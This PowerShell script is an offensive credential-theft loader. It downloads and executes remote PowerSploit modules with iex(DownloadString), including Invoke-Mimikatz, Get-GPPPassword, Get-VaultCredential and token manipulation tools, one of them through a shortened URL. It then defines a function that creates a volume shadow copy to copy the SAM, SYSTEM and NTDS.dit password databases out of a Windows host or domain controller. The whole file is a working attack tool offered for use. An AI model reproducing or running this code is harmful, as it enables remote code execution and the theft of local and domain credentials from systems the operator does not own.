#command to load
#iex(New-Object Net.WebClient).DownloadString('http://j.mp/redfast')
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Redfast/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1')
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Redfast/PowerSploit/master/Exfiltration/Get-VaultCredential.ps1')
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Redfast/PowerSploit/master/Exfiltration/Invoke-CredentialInjection.ps1')
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Redfast/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Redfast/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1')
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Redfast/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1')
function Get-PasswordFile { 
<# 
.SYNOPSIS 
  
    Copies either the SAM or NTDS.dit and system files to a specified directory. 
  
.PARAMETER DestinationPath 
  
    Specifies the directory to the location where the password files are to be copied. 
  
.OUTPUTS 
  
    None or an object representing the copied items. 
  
.EXAMPLE 
  
    Get-PasswordFile "c:\temp"
  
#> 
  
    [CmdletBinding()] 
    Param 
    ( 
        [Parameter(Mandatory = $true, Position = 0)] 
        [ValidateScript({Test-Path $_ -PathType 'Container'})]  
        [ValidateNotNullOrEmpty()] 
        [String]  
        $DestinationPath     
    ) 
  
        #Define Copy-RawItem helper function from http://gallery.technet.microsoft.com/scriptcenter/Copy-RawItem-Private-NET-78917643 
        function Copy-RawItem
        { 
  
        [CmdletBinding()] 
        [OutputType([System.IO.FileSystemInfo])] 
        Param ( 
            [Parameter(Mandatory = $True, Position = 0)] 
            [ValidateNotNullOrEmpty()] 
            [String] 
            $Path, 
  
            [Parameter(Mandatory = $True, Position = 1)] 
            [ValidateNotNullOrEmpty()] 
            [String] 
            $Destination, 
  
            [Switch] 
            $FailIfExists
        ) 
  
        # Get a reference to the internal method - Microsoft.Win32.Win32Native.CopyFile() 
        $mscorlib = [AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.Location -and ($_.Location.Split('\')[-1] -eq 'mscorlib.dll')} 
        $Win32Native = $mscorlib.GetType('Microsoft.Win32.Win32Native') 
        $CopyFileMethod = $Win32Native.GetMethod('CopyFile', ([Reflection.BindingFlags] 'NonPublic, Static'))  
  
        # Perform the copy 
        $CopyResult = $CopyFileMethod.Invoke($null, @($Path, $Destination, ([Bool] $PSBoundParameters['FailIfExists']))) 
  
        $HResult = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
  
        if ($CopyResult -eq $False -and $HResult -ne 0) 
        { 
            # An error occured. Display the Win32 error set by CopyFile 
            throw ( New-Object ComponentModel.Win32Exception ) 
        } 
        else 
        { 
            Write-Output (Get-ChildItem $Destination) 
        } 
    } 
   
    #Check for admin rights
    if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
    {
        Write-Error "Not running as admin. Run the script with elevated credentials"
        Return
    }
         
    #Get "vss" service startup type 
    $VssStartMode = (Get-WmiObject -Query "Select StartMode From Win32_Service Where Name='vss'").StartMode 
    if ($VssStartMode -eq "Disabled") {Set-Service vss -StartUpType Manual} 
  
    #Get "vss" Service status and start it if not running 
    $VssStatus = (Get-Service vss).status  
    if ($VssStatus -ne "Running") {Start-Service vss} 
  
        #Check to see if we are on a DC 
        $DomainRole = (Get-WmiObject Win32_ComputerSystem).DomainRole 
        $IsDC = $False
        if ($DomainRole -gt 3) { 
            $IsDC = $True
            $NTDSLocation = (Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\services\NTDS\Parameters)."DSA Database File"
            $FileDrive = ($NTDSLocation).Substring(0,3) 
        } else {$FileDrive = $Env:HOMEDRIVE + '\'} 
      
        #Create a volume shadow filedrive 
        $WmiClass = [WMICLASS]"root\cimv2:Win32_ShadowCopy"
        $ShadowCopy = $WmiClass.create($FileDrive, "ClientAccessible") 
        $ReturnValue = $ShadowCopy.ReturnValue 
  
        if ($ReturnValue -ne 0) { 
            Write-Error "Shadow copy failed with a value of $ReturnValue"
            Return 
        }  
      
        #Get the DeviceObject Address 
        $ShadowID = $ShadowCopy.ShadowID 
        $ShadowVolume = (Get-WmiObject Win32_ShadowCopy | Where-Object {$_.ID -eq $ShadowID}).DeviceObject 
      
            #If not a DC, copy System and SAM to specified directory 
            if ($IsDC -ne $true) { 
  
                $SamPath = Join-Path $ShadowVolume "\Windows\System32\Config\sam" 
                $SystemPath = Join-Path $ShadowVolume "\Windows\System32\Config\system"
  
                #Utilizes Copy-RawItem from Matt Graeber 
                Copy-RawItem $SamPath "$DestinationPath\sam"
                Copy-RawItem $SystemPath "$DestinationPath\system"
            } else { 
              
                #Else copy the NTDS.dit and system files to the specified directory             
                $NTDSPath = Join-Path $ShadowVolume "\Windows\NTDS\NTDS.dit" 
                $SystemPath = Join-Path $ShadowVolume "\Windows\System32\Config\system"
  
                Copy-RawItem $NTDSPath "$DestinationPath\ntds"
                Copy-RawItem $SystemPath "$DestinationPath\system"
            }     
      
        #Return "vss" service to previous state 
        If ($VssStatus -eq "Stopped") {Stop-Service vss} 
        If ($VssStartMode -eq "Disabled") {Set-Service vss -StartupType Disabled} 
}
echo "Imported :"
echo "  Get-GPPPassword"
echo "  Get-PasswordFile"
echo "  Get-VaultCredential"
echo "  Invoke-CredentialInjection"
echo "  Invoke-Mimikatz"
echo "  Invoke-TokenManipulation"
echo "	Invoke-NinjaCopy"
